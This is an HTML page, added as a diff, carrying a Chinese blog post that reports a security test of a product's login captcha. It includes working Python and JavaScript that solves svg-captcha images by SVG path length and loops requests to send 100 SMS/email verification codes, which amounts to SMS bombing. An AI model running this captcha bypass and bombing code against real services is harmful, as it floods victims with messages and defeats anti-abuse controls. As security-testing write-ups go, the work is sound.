@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+    <meta name="description" content="龅牙晴在 Github 上的个人博客">
+    <meta name="keyword" content="安全，漏洞挖掘，漏洞复现">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://upload-images.jianshu.io/upload_images/6269327-54939abc2f06655f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    <link rel="alternate" type="application/atom+xml" title="折戟" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        一次验证码安全测试｜R_song&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="https://XD0ne.github.io/2020/11/02/38.一次验证码安全测试/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+
+<style>
+
+    header.intro-header {
+        background-image: url('https://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
+" data-ishome="false">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    折戟
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+								
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/categories/">categories</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/tags/">tags</a>
+                        </li>
+							
+						
+                    
+					
+					
+						<li>
+							<a href="/about">About</a>
+						</li>
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+<meta name="referrer" content="no-referrer">
+<!--only post-->
+
+
+<img class="wechat-title-img" src="https://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('https://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>一次验证码安全测试</h1>
+                    
+                    <span class="meta">
+                         作者 折戟
+                        <span>
+                          日期 2020-11-02
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#安全测试" title="安全测试">安全测试</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            一次验证码安全测试
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="一次验证码安全测试"><a href="#一次验证码安全测试" class="headerlink" title="一次验证码安全测试"></a>一次验证码安全测试</h1><hr>
+<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近在对某产品进行安全测试时，在对登录功能模块的逻辑漏洞进行检测时，在验证码检测发现一定的安全缺陷。</p>
+<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><h3 id="不安全的验证码"><a href="#不安全的验证码" class="headerlink" title="不安全的验证码"></a>不安全的验证码</h3><p>在该产品的登录功能处存在忘记密码和注册子功能，这两个子功能都有发送短信验证码和手机验证码以及在图像验证码。其中图像类型验证码如下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-cdb8ba0a03bbba06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="验证码"><br>刷新验证码收到的<code>response</code>如下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-981db70c105599bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="svg"><br>可知该验证码是svg验证码，该验证码号称因为是svg格式所以想要使用打码平台进行识别需要再转成图像文件格式然后在识别。但是该svg-captcha验证码项目因为其设计上的缺陷，导致其可被工具百分百识别。具体破解详情可以看该验证码项目的<a href="https://github.com/produck/svg-captcha/issues/45" target="_blank" rel="noopener">issus</a>，复现一下，十分有意思。<br>根据上面的验证码图片，简单描述就是该验证码的svg文件由5个部分组成，其中四个为验证码字符，另一个为干扰线，其中不同字符的在在svg中的长度也不同，所以可以计算svg中每部分的长度来确定其是什么字符。但是不同字体以及其他的配置会导致长度不一样，所以在不同场景下要针对性的去计算出每个字符对应的长度。</p>
+<h4 id="验证码破解"><a href="#验证码破解" class="headerlink" title="验证码破解"></a>验证码破解</h4><p>这个图就是默认的字体，但是我在使用公开的node js<a href="https://github.com/haua/svg-captcha-recognize" target="_blank" rel="noopener">破解代码</a>代码时出现不能百分百破解的情况。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-cdb8ba0a03bbba06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="验证码"><br>对比svg文件时发现，虽然本次产品使用的是svg的默认字体，但是在其他的配置参数并不是默认的，通过反复比较，调整参数，对比获取的验证码图片和我们生成的验证码图片如下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-7e9b673a9f9aae7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="对比图"><br>使用PS对比，两个图可完全重合，确保参数没有问题：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-aa3e1f7685dc757c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PS对比"><br>找到的参数如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const cap = svgCaptcha(&apos;njsc&apos;,&#123;</span><br><span class="line">width: 100,</span><br><span class="line">height: 40,</span><br><span class="line">fontSize:50</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>由此，我们可以按照上面的配置去生成验证码，求出字符长度和字符的对应表。<br><code>createdata.js</code>该文件就一个函数，接收四位字符串的输入，根据该输入生成指定的验证码。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getData(csvText)&#123;</span><br><span class="line">var svgCaptcha = require(&apos;svg-captcha&apos;);</span><br><span class="line">const cap = svgCaptcha(csvText,&#123;</span><br><span class="line">width: 100,</span><br><span class="line">height: 40,</span><br><span class="line">fontSize:50</span><br><span class="line">&#125;)</span><br><span class="line">//console.log(cap)</span><br><span class="line">return cap//,cap.data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>xxx.py</code>改文件用来生成字符与长度的对应表。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import execjs</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 第一部分，刷新获取验证码，从返回包中获取验证码id和验证码svg文件</span><br><span class="line">def GetCode(s):</span><br><span class="line">    with open(&quot;./creatcode.js&quot;, &apos;r&apos;, encoding =&apos;utf-8&apos;) as f:</span><br><span class="line">        content = f.read() #读取js文件的全部内容到content变量中</span><br><span class="line">    ctx = execjs.compile(content)</span><br><span class="line">    jscode = &apos;getData(&quot;&#123;&#125;&quot;)&apos;.format(s)</span><br><span class="line">    text= ctx.eval(jscode)</span><br><span class="line">    return text</span><br><span class="line"></span><br><span class="line">for i in (&apos;1234567890qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP&apos;):</span><br><span class="line">    flag = 4*i</span><br><span class="line">    cap_img = GetCode(flag) # 验证码svg文件</span><br><span class="line">    path_list = re.findall(&apos;&lt;path.*?/&gt;&apos;, str(cap_img))</span><br><span class="line">    for x in path_list:</span><br><span class="line">        if len(x)&gt;500:</span><br><span class="line">            with open(&quot;map.txt&quot;,&quot;a&quot;) as f:</span><br><span class="line">                f.write(str(i) + &quot; &quot; + str(len(x)) + &quot;\n&quot; )</span><br></pre></td></tr></table></figure></p>
+<p>获得字符长度对应表之后，可能会出现不同字符长度相同的情况，这个时候可以根据其他特征去区分一下就行，比如通过获取绘制过程中最小\最大的x轴y轴的坐标来区分。例子可以看node js<a href="https://github.com/haua/svg-captcha-recognize" target="_blank" rel="noopener">破解代码</a>的方法。<br>由于svg验证码存在的设计缺陷，我们可以用计算好的对应表去破解该验证码。很多人会说可以用打码平台也可以解决这类图像验证码的问题，但是其速度肯定远远比不上这里的简单的计算，识别是毫秒级的而且不需要接入第三方、本地即可。</p>
+<h2 id="任意手机短信-邮箱邮件轰炸"><a href="#任意手机短信-邮箱邮件轰炸" class="headerlink" title="任意手机短信/邮箱邮件轰炸"></a>任意手机短信/邮箱邮件轰炸</h2><p>因为我们测试的是登录模块的注册功能，所以很可能存在任意手机短信/邮箱邮件轰炸漏洞，只要绕过图像验证码即可。测试的逻辑过程如下：</p>
+<ol>
+<li>发送一个刷新验证码的包，从返回包中获取验证码id和验证码svg文件</li>
+<li>svg文件使用公开的node js<a href="https://github.com/haua/svg-captcha-recognize" target="_blank" rel="noopener">破解代码</a>识别验证码，将其中的字符对应表换成我们自己训练的。</li>
+<li>解密的验证码和验证码id传给发送邮件的请求包，发送请求。<br>除去已经下好的node js破解文件，把index.js换成自己的map表，自己写了两个部分，一个Python文件，主要负责进行发包收包，一个是js文件，进行验证码识别。<br><code>code.js</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getData(csvText)&#123;   //接收Python发过来的svg文件</span><br><span class="line">csvText = csvText.replace(/\*/g,&quot;\&quot;&quot;)   //这里应该用编码来解决符合问题的</span><br><span class="line">console.log(csvText)</span><br><span class="line">const &#123; recognize &#125; = require(&apos;./index&apos;) //调用index进行验证码识别</span><br><span class="line">const text = recognize(csvText) </span><br><span class="line">return text</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p><code>code.py</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import execjs</span><br><span class="line"></span><br><span class="line"># 第一部分，刷新获取验证码，从返回包中获取验证码id和验证码svg文件</span><br><span class="line">def GetCode():</span><br><span class="line">    while True:</span><br><span class="line">        RefreshCode = requests.get(&apos;xx.xx&apos;) </span><br><span class="line">        captcha_key = RefreshCode.json()[&quot;captcha_key&quot;]</span><br><span class="line">        captcha_img = RefreshCode.json()[&quot;captcha_img&quot;]</span><br><span class="line">        # 调用js破解验证码</span><br><span class="line">        with open(&quot;./pwc.js&quot;, &apos;r&apos;, encoding =&apos;utf-8&apos;) as f:</span><br><span class="line">            content = f.read() #读取js文件的全部内容到content变量中</span><br><span class="line">        ctx = execjs.compile(content)</span><br><span class="line">        captcha_img = captcha_img.replace(&quot;\&quot;&quot;,&quot;*&quot;)</span><br><span class="line">        jscode = &apos;getData(&quot;&#123;&#125;&quot;)&apos;.format(captcha_img)</span><br><span class="line">        captcha = ctx.eval(jscode)</span><br><span class="line">        if len(captcha) == 4:   #这里因为没有自己去计算对于长度表，所以部分识别不出来</span><br><span class="line">            break</span><br><span class="line">    return captcha_key,captcha</span><br><span class="line"></span><br><span class="line">for i in range(0,100):</span><br><span class="line">    key,code = GetCode()</span><br><span class="line">    POSTHeader = &#123;</span><br><span class="line">&quot;Pragma&quot;: &quot;no-cache&quot;,</span><br><span class="line">&quot;Cache-Control&quot;: &quot;no-cache&quot;,</span><br><span class="line">&quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    POSTData = &#123;</span><br><span class="line">&apos;captcha_key&apos;: key,</span><br><span class="line">&apos;captcha&apos; : code,</span><br><span class="line">&apos;email&apos;: &apos;x@xx.com&apos;,</span><br><span class="line">&#125;</span><br><span class="line">    SentEmailURL = &apos;xxx&apos;</span><br><span class="line">    Cookie = &#123;&quot;Cookie&quot;:&apos;&apos;&#125;</span><br><span class="line">    SentEmil = requests.post(SentEmailURL,headers=POSTHeader,data=POSTData,cookies=Cookie)</span><br><span class="line">    print(SentEmil.text)</span><br></pre></td></tr></table></figure></p>
+<p>测试结果如下图：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-d9e8b4ea93aebd1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="hack"><br>收到的短信验证码：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-309dbb36ee1bd6fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="短信"><br>经过测试，可以看到虽然会有提示请求被阻止，但还是可以继续发送短信验证码，最后测试几分钟内发送了100条短信。而邮箱验证码设置在10分钟内同一邮箱账号只发送20次，20次之前也会提示次数超过限制。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次主要是想去测一测短信轰炸的，然后顺道发现了不安全的验证码问题，两个都是验证码的逻辑漏洞，一个是图片验证码设计的缺陷，一个是短信验证码没有设置阈值以及频率。</p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2020/10/26/37.一次服务器被传webshell事件溯源/" data-toggle="tooltip" data-placement="top" title="一次服务器被传webshell事件溯源">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-text"></span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#一次验证码安全测试"><span class="toc-text">一次验证码安全测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#背景"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#详情"><span class="toc-text">详情</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#不安全的验证码"><span class="toc-text">不安全的验证码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#验证码破解"><span class="toc-text">验证码破解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#任意手机短信-邮箱邮件轰炸"><span class="toc-text">任意手机短信/邮箱邮件轰炸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+                </li></div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#安全测试" title="安全测试">安全测试</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a href="https://teazmh.github.io/">Tea_Mh</a></li>
+                        
+                        <li><a href="https://zheng19970225.github.io/">让子弹飞一会</a></li>
+                        
+                        <li><a href="https://luckyjq.github.io/">LuckyQ</a></li>
+                        
+                        <li><a href="https://blog.littleghost.ml">LittleGhost</a></li>
+                        
+                        <li><a href="https://ai-sewell.me">老锥</a></li>
+                        
+                        <li><a href="https://canbaoafeizai.github.io">T1ger</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                    <li>
+                        <a target="_blank" href="https://twitter.com/IIGHJH5O4mvbeF9?s=09">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/rao-song-63?utm_source=qq&amp;utm_medium=social">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/u/3870422953?refer_flag=1001030001_&amp;nick=RS丶从徒手开碧根果开始">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank" href="https://github.com/XD0ne">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 折戟 2020
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                     Theme by Haojen Ma
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://XD0ne.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="https://upload-images.jianshu.io/upload_images/6269327-4c7992ea7ad8aea9.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+<script type="text/javascript"
+color="0,0,0" opacity='0.4' zIndex="-2" count="66" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+
+</body>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+</html>
